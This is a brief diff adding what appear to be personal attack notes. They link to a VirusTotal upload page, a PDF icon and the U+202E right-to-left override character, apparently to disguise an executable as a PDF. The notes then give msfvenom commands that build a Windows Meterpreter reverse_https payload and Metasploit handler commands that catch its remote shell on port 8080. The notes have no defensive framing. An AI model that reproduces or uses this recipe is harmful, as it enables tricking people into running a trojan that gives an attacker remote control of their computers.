@@ -1,0 +1,13 @@
+https://www.virustotal.com/gui/home/upload
+https://archivum.grupomarista.org.br/pergamumweb/downloadArquivo?vinculo=QzRFMkY5MlkyOWtSVzF3Y21WellUMHhKbUZqWlhKMmJ6MHpOemd3T1RRbWMyVnhVR0Z5WVdkeVlXWnZQVEVtYzJWeFUyVmpZVzg5T0NacllYSmtaWGc5VGlac2IyTmhiRUZ5Y1hWcGRtODlRMDlOVUVGU1ZFbE1TRUZOUlU1VVR5WnViMjFsUTJGdGFXNW9iejB3TURBeE16QXZNREF3TVRNd1lXUXVjR1JtMDFDQ0U5MQ==&nomeExtensao=.pdf
+https://icon-icons.com/icon/pdf/24287
+https://unicode-explorer.com/c/202E
+
+msvenom -p windows/meterpreter/reverse_https LHOST= LPORT=8080 -f exe -o ven_win_rev_https_8080.exe
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST
+set LPORT 8080
+
+service
